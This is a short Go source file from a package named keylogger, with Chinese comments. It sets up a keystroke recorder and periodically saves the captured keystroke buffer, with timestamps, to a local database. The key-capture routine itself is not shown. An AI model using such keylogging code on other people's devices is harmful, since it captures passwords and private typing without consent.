package keylogger

import (
	"gorm.io/gorm"
	"log"
	"time"
)

type Keylogger struct {
	dbPath        string        // 数据库路径
	writeInterval time.Duration // 写入数据库的时间间隔
	db            *gorm.DB
	deviceID      string
	deviceName    string
}

// 返回一个Keylogger实例
func NewKeylogger(DBPath string, Interval time.Duration) *Keylogger {
	Keylogger := &Keylogger{
		dbPath:        DBPath,
		writeInterval: Interval,
	}
	return Keylogger
}

//开始记录
func (this *Keylogger) record() {
	go this.insert2Data()
	realKeylogger()
}

// 开始运行Keylogger
func (this *Keylogger) Start() {
	this.initDB()
	this.record()
}

// 插入Data表
func (this *Keylogger) insert2Data() {
	for {
		mutex.Lock()
		//log.Println("Data inserting", stringBuffer)

		//不上传空数据
		if stringBuffer != "" {
			now := time.Now()
			result := this.db.Create(&Data{Timestamp: now.Unix(), KeystrokeRecord: stringBuffer})
			if result.Error != nil {
				log.Println("Data inserting error:", result.Error.Error())
			} else {
				log.Println("Data inserting succeed:", stringBuffer)
			}
		}
		stringBuffer = ""
		mutex.Unlock()

		time.Sleep(this.writeInterval)
	}
}
